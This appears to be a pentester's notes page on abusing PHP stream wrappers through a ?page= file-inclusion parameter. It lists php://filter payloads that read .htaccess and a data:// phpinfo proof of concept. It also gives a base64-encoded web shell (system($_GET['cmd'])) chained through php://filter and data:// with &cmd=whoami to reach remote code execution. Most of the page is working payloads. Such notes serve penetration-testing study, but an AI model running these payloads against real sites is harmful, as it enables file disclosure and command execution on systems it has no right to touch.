PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in PHP protocols, which may lead to significant security risks if not properly handled.
### Filter Wrapper

For example, the table below represents the output of the target file .htaccess using the different string filters in PHP, Don't forget to add `?page=`.

| **Payload**                                           | **Output**                                   |
| ----------------------------------------------------- | -------------------------------------------- |
| php://filter/convert.base64-encode/resource=.htaccess | UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz |
| php://filter/string.rot13/resource=.htaccess          | ErjevgrRatvar ba Bcgvbaf -Vaqrkrf            |
| php://filter/string.toupper/resource=.htaccess        | REWRITEENGINE ON OPTIONS -INDEXES            |
| php://filter/string.tolower/resource=.htaccess        | rewriteengine on options -indexes            |
| php://filter/string.strip_tags/resource=.htaccess     | RewriteEngine on Options -Indexes            |
| No filter applied                                     | RewriteEngine on Options -Indexes            |

### Data Wrapper

The data stream wrapper is another example of PHP's wrapper functionality. The `data://` wrapper allows inline data embedding. It is used to embed small amounts of data directly within the URI, often used for embedding small data sets or resources.

**Note:** allow_url_include must be set!

For example, `?page=data:text/plain,<?php%20phpinfo();%20?>` (POC)

We could use both data and filter by adding this payload `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=` which belongs to this `<?php system($_GET['cmd']);?>`, then we could do something like this:
`php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami`

Now we have RCE!.

![](../Attachments/Pasted%20image%2020240212141401.png)

Taken from https://www.cdxy.me/?p=752

check https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams for more payloads and testing.